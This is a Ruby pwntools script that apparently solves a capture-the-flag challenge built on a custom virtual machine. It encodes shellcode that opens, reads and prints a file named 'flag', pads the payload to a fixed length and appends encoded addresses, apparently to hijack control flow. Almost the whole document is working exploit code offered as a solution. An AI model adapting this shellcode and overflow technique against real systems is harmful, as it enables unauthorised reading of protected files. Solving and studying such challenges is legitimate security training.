#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pwn'        # https://github.com/peter50216/ruby-pwntools

def middle(val)
  a = (val & 127).chr
  val >>= 7
  b = (val & 127).chr
  c = (val >> 7).chr
  a + c + b
end

base = 0xf5f9e
buf = base + 0x39 - 5
syscall_inst = "\x20\x00"
def movi(reg, val)
  "\x12" + (reg * 16).chr + middle(val)
end
<<-EOS
# open
mov r1, buf
mov r0, 1
syscall

# read
mov r3, 100
mov r2, buf
mov r1, 2 # fd = 2
mov r0, 3
syscall

# write
mov r3, 100
mov r2, buf
mov r1, 1
mov r0, 2
syscall
EOS
shellcode = 
  movi(1, buf) <<
  movi(0, 1) <<
  syscall_inst <<
  movi(3, 31) <<
  movi(2, buf) <<
  movi(1, 2) <<
  movi(0, 3) <<
  syscall_inst <<
  # movi(3, 100) <<
  movi(2, buf) <<
  movi(1, 1) <<
  movi(0, 2) <<
  syscall_inst
fail if shellcode.size > 0x34
shellcode = shellcode.ljust(0x34, "\x00") + "flag\x00"
print(shellcode + middle(0x12345) + middle(0) + middle(base)) 
